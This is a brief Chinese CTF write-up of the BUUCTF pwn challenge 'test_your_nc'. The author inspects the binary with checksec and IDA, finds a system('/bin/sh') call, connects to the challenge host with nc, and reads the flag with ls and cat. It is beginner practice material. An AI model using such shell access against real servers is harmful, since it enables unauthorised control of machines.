# BUUCTF-PWN-test_your_nc

<img src="https://i-blog.csdnimg.cn/blog_migrate/6fcd37715ca411b2a06b35568e8989c6.png" alt="" style="max-height:339px; box-sizing:content-box;" />


得到 文件 与 ip 端口

从这道题我们能理解PWN

pwn 是为了能够得到最高权限的目的 pwn掉服务器 我们就能获得最高权限 来控制电脑

我们把文件放入

```bash
checksec test
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/18318ad506739ff6c6bd9e36ef2d0cd6.png" alt="" style="max-height:183px; box-sizing:content-box;" />


得到信息 我们把文件放入 ida64



<img src="https://i-blog.csdnimg.cn/blog_migrate/5e74f7bf7ae8f4337646591b6605d8f1.png" alt="" style="max-height:176px; box-sizing:content-box;" />


得到这个命令

```perl
system("/bin/sh");
```

有了这个代码 我们的权限就会得到提升，我们就能够查看电脑上的其他文件，获取flag。可以把它理解为一把开启flag宝箱的钥匙

我们可以 开始nc

```cobol
nc node4.buuoj.cn 29828
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/feb221c0e80dbabffff245085c8b6ed8.png" alt="" style="max-height:631px; box-sizing:content-box;" />


很轻松的就能使用代码ls 来展示文件

并且我们发现flag

```bash
cat flag
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d741b3e96062dd694c42ffdf8f131924.png" alt="" style="max-height:94px; box-sizing:content-box;" />